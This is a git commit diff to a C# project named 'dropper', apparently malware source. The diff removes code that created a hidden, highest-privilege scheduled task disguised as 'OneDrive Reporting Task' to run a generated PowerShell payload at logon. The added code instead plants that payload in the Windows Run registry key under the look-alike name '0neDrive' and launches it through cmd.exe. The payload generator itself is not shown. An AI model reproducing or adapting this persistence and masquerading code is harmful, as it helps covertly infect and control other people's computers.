b3d86a58b652ab40e406a7fd0d74223781b904db
chash <70506265+ch2sh@users.noreply.github.com>
2022-05-12 19:28:10 +0800

    Add files via upload

--- dropper/Program.cs
+++ dropper/Program.cs
@@ -1,6 +1,7 @@
 ﻿using System;
-using System.IO;
+using System.Linq;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace dropper
 {
@@ -10,83 +11,17 @@ namespace dropper
         private static string prefix = "";
         private static string geolock = "";
 
-        static void Main(string[] args)
+        static void Main()
         {
-            Process schproc = new Process()
-            {
-                StartInfo = new ProcessStartInfo()
-                {
-                    FileName = "schtasks.exe",
-                    Arguments = "/query /tn \"OneDrive Reporting Task\"",
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true
-                }
-            };
-            schproc.Start();
-            string error = schproc.StandardError.ReadToEnd();
-            schproc.WaitForExit();
-            if (error == string.Empty) Environment.Exit(1);
+            // WORK IN PROGRESS
 
-            string xmlpath = Path.GetTempFileName();
-            File.WriteAllText(xmlpath,
-@"<?xml version=""1.0"" encoding=""UTF-16""?>
-<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-      <Delay>PT1S</Delay>
-    </LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id=""Author"">
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>false</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>false</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context=""Author"">
-    <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>" + PGen.GenerateCommand(token, prefix, geolock, new Random()) + @"</Arguments>
-    </Exec>
-  </Actions>
-</Task>");
-
-            Process.Start(new ProcessStartInfo()
-            {
-                FileName = "schtasks.exe",
-                Arguments = "/create /tn \"OneDrive Reporting Task\" /xml " + xmlpath,
-                WindowStyle = ProcessWindowStyle.Hidden
-            }).WaitForExit();
-
-            Process.Start(new ProcessStartInfo()
-            {
-                FileName = "schtasks.exe",
-                Arguments = "/run /i /tn \"OneDrive Reporting Task\"",
-                WindowStyle = ProcessWindowStyle.Hidden
-            }).WaitForExit();
-
-            File.Delete(xmlpath);
+            Random rng = new Random();
+            string payload = PGen.GenerateCommand(token, prefix, geolock, rng);
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            if (key.GetValueNames().Contains("0neDrive")) Environment.Exit(1);
+            key.SetValue("0neDrive", payload);
+            key.Dispose();
+            Process.Start("cmd.exe", "/c " + payload);
         }
     }
 }
